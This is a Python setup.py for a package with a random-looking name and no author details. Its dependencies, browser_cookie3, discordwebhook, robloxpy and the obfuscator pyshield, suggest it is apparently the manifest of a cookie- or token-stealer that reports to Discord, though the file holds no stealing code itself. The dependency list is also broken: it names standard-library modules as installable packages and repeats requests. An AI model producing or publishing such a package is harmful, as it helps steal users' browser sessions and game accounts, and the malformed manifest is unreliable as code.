from setuptools import setup, find_packages
# :)
VERSION = '1.0.0'

# Setting up
setup(
    name='xoloaoqcjnreyc', 
    author="",
    author_email="",
    packages=find_packages(),
    install_requires=["re", "browser_cookie3", "discordwebhook", "robloxpy", "requests", "requests", "codecs", "json", "pyshield"],
)